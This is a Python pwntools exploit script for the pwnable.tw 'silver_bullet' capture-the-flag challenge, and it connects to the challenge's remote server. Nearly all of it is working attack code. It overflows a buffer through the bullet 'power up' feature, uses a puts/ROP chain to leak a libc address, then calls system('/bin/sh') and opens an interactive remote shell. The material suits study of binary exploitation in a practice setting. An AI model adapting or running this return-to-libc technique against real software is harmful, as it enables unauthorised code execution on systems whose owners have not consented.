from pwn import *
context(arch='i386',log_level='debug')
# p=process("./silver_bullet",env={"LD_PRELOAD":"./libc_32.so.6"})
p=remote("chall.pwnable.tw","10103")
def create(desc):
	p.sendlineafter("Your choice :","1")
	p.sendlineafter("bullet :",desc)

def powerup(desc):
	p.sendlineafter("Your choice :","2")
	p.sendlineafter("bullet :",desc)

def beat():
	p.sendlineafter("Your choice :","3")



# gdb.attach(p,"b*0x0804862C\nb *0x80489B4\nc")
# gdb.attach(p,"b*0x08048935\nc")
# sleep(1)
create("a"*47)
powerup("a"*1)
# gdb.attach(p,"b*0x08048935\nc")
plt_puts=0x080484A8
main_addr=0x08048954
got_read=0x0804AFD0
payload="\xff"*0x7+p32(plt_puts)+p32(main_addr)+p32(got_read)
powerup(payload)
# p.recv()
beat()
p.recvuntil("You win !!\n")
libc_base= u32(p.recvuntil("+")[:4])-868800
# print hex(libc_base)
e=ELF('./libc_32.so.6')
sys_addr=libc_base+e.symbols['system']
sh_addr=libc_base+58871


create("a"*47)
powerup("a"*1)
payload="\xff"*7+p32(sys_addr)*2+p32(sh_addr)
powerup(payload)
beat()
p.interactive()